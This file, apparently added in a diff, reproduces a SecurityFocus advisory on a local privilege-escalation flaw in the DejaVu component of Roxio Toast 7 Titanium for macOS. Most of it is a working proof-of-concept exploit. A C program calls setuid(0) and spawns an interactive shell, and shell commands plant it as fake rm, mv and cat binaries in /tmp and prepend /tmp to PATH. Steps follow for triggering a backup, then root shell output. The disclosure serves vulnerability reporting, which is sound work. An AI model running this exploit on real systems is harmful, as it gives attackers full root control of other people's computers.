@@ -1,0 +1,49 @@
+source: http://www.securityfocus.com/bid/19596/info
+
+Roxio Toast is prone to a local privilege-escalation vulnerability because it fails to properly sanitize user-supplied input. As a result, local users may set their own search path for external applications that are called by setuid programs that are included in Roxio Toast.
+
+This issue allows local attackers to gain superuser privileges, resulting in a complete compromise of affected computers.
+
+This issue affects the DejaVu component that is installed by default in a standard installation of the vulnerable application. DejaVu is a third-party component that is maintained by Propaganda Productions. Roxio Toast version 7 Titanium includes the vulnerable component; other versions may also be affected.
+
+1-Exploitation is trivial. A user must first create small program such
+as the one demonstrated by simple.c below.
+
+netragard-test-1$ cat > simple.c
+
+main()
+{
+    seteuid(0);
+    setuid(0);
+    setegid(0);
+    setgid(0);
+    system("/bin/sh -i");
+}
+
+2-Once the user has created the program, the user must comple the
+program, copy the program to replace rm, mv and cat, and insert it
+into the $PATH variable.
+
+netragard-test-1$cc -o chmod simple.c
+netragard-test-1$cp chmod /tmp/rm
+netragard-test-1$cp chmod /tmp/mv
+netragard-test-1$cp chmod /tmp/cat
+netragard-test-1$export PATH=/tmp/:$PATH
+
+3-Once the user has finished with step 2, the user must then launch
+the "System Preferences" control pannel.
+
+netragard-test-1$/Applications/System\
+Preferences.app/Contents/MacOS/System\ Preferences
+
+4-After the user has launched the Systems Preferences helper
+application, a GUI window should display. From that window click on
+"Deja Vu" located in the "other" section. From there create a manual
+backup and then click the backup button. At that point you should be
+presented with a root shell prompt:
+
+sh: no job control in this shell
+sh-2.05b# id
+
+uid=0(root) gid=0(wheel) groups=0(wheel), 81(appserveradm),
+79(appserverusr), 80(admin)
